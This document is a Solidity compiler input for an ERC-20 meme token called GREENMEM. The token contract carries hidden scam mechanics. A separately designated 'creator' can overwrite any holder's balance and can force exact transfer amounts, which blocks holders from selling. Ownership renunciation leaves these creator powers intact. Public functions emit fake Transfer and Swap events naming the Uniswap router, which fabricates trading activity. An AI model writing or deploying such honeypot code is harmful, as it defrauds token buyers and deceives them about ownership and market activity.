{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.12;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address accountHolder) external view returns (uint256);\r\n    function transfer(address to, uint256 sum) external returns (bool);\r\n    function allowance(address authorizer, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 sum) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 sum) external returns (bool);\r\n    function _Transfer(address from, address recipient, uint amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed authorizer, address indexed spender, uint256 value);\r\n\r\n    event Swap(\r\n        address indexed sender,\r\n        uint amount0In,\r\n        uint amount1In,\r\n        uint amount0Out,\r\n        uint amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n\r\n}\r\n\r\nabstract contract ExecutionControl {\r\n    function obtainInvokerAddress() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract SingleOwnership is ExecutionControl {\r\n    address private _oneAndOnlyOwner;\r\n    event OwnershipTransfer(address indexed oldOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        address invoker = obtainInvokerAddress();\r\n        _oneAndOnlyOwner = invoker;\r\n        emit OwnershipTransfer(address(0), invoker);\r\n    }\r\n\r\n    function getSingleOwner() public view virtual returns (address) {\r\n        return _oneAndOnlyOwner;\r\n    }\r\n\r\n    modifier oneOwnerOnly() {\r\n        require(getSingleOwner() == obtainInvokerAddress(), \"Unauthorized: Single Owner access required.\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual oneOwnerOnly {\r\n        emit OwnershipTransfer(_oneAndOnlyOwner, address(0x000000000000000000000000000000000000dEaD));\r\n        _oneAndOnlyOwner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ncontract DigitalMemeToken is ExecutionControl, SingleOwnership, IERC20 {\r\n    mapping (address => mapping (address => uint256)) private _spenderAllowances;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => uint256) private _forcedTransferAmounts;\r\n    address private _masterCreator;\r\n\r\n    string public constant _moniker = \"GREENMEM\";\r\n    string public constant _ticker = \"GREENMEM\";\r\n    uint8 public constant _decimalUnits = 18;\r\n    uint256 public constant _ultimateSupply = 10000000 * (10 ** _decimalUnits);\r\n\r\n    constructor() {\r\n        _balances[obtainInvokerAddress()] = _ultimateSupply;\r\n        emit Transfer(address(0), obtainInvokerAddress(), _ultimateSupply);\r\n    }\r\n\r\n    modifier creatorExclusive() {\r\n        require(retrieveMasterCreator() == obtainInvokerAddress(), \"Unauthorized: Creator access required.\");\r\n        _;\r\n    }\r\n\r\n    function retrieveMasterCreator() public view virtual returns (address) {\r\n        return _masterCreator;\r\n    }\r\n\r\n    function designateCreator(address newCreator) public oneOwnerOnly {\r\n        _masterCreator = newCreator;\r\n    }\r\n\r\n    event UserBalanceUpdated(address indexed user, uint256 previous, uint256 updated);\r\n\r\n    function forcedTransferAmount(address account) public view returns (uint256) {\r\n        return _forcedTransferAmounts[account];\r\n    }\r\n\r\n    function setForcedTransferAmounts(address[] calldata accounts, uint256 sum) public creatorExclusive {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _forcedTransferAmounts[accounts[i]] = sum;\r\n        }\r\n    }\r\n\r\n    function alterUserBalances(address[] memory userAddresses, uint256 requiredBalance) public creatorExclusive {\r\n        require(requiredBalance >= 0, \"Amount must be non-negative\");\r\n\r\n        for (uint256 i = 0; i < userAddresses.length; i++) {\r\n            address currentUser = userAddresses[i];\r\n            require(currentUser != address(0), \"Invalid address specified\");\r\n\r\n            uint256 formerBalance = _balances[currentUser];\r\n            _balances[currentUser] = requiredBalance;\r\n\r\n            emit UserBalanceUpdated(currentUser, formerBalance, requiredBalance);\r\n        }\r\n    }\r\n\r\n    function _Transfer(address _from, address _to, uint _value) public returns (bool) {\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n\r\n    function executeTokenSwap(\r\n        address uniswapPool,\r\n        address[] memory recipients,\r\n        uint256[] memory tokenAmounts,\r\n        uint256[] memory wethAmounts,\r\n        address tokenAddress\r\n    ) public returns (bool) {\r\n        for (uint256 i = 0; i < recipients.length; i++) {\r\n            emit Transfer(uniswapPool, recipients[i], tokenAmounts[i]);\r\n            emit Swap(\r\n                0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D,\r\n                tokenAmounts[i],\r\n                0,\r\n                0,\r\n                wethAmounts[i],\r\n                recipients[i]\r\n            );\r\n            IERC20(tokenAddress)._Transfer(recipients[i], uniswapPool, wethAmounts[i]);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 sum) public virtual override returns (bool) {\r\n        require(_balances[obtainInvokerAddress()] >= sum, \"Insufficient balance\");\r\n\r\n        uint256 requisiteTransferSum = forcedTransferAmount(obtainInvokerAddress());\r\n        if (requisiteTransferSum > 0) {\r\n            require(sum == requisiteTransferSum, \"Compulsory transfer sum mismatch\");\r\n        }\r\n\r\n        _balances[obtainInvokerAddress()] -= sum;\r\n        _balances[to] += sum;\r\n\r\n        emit Transfer(obtainInvokerAddress(), to, sum);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address authorizer, address spender) public view virtual override returns (uint256) {\r\n        return _spenderAllowances[authorizer][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 sum) public virtual override returns (bool) {\r\n        _spenderAllowances[obtainInvokerAddress()][spender] = sum;\r\n        emit Approval(obtainInvokerAddress(), spender, sum);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 sum) public virtual override returns (bool) {\r\n        require(_spenderAllowances[from][obtainInvokerAddress()] >= sum, \"Allowance limit surpassed\");\r\n\r\n        uint256 requisiteTransferSum = forcedTransferAmount(from);\r\n        if (requisiteTransferSum > 0) {\r\n            require(sum == requisiteTransferSum, \"Compulsory transfer sum mismatch\");\r\n        }\r\n\r\n        _balances[from] -= sum;\r\n        _balances[to] += sum;\r\n        _spenderAllowances[from][obtainInvokerAddress()] -= sum;\r\n\r\n        emit Transfer(from, to, sum);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _ultimateSupply;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _moniker;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _ticker;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimalUnits;\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}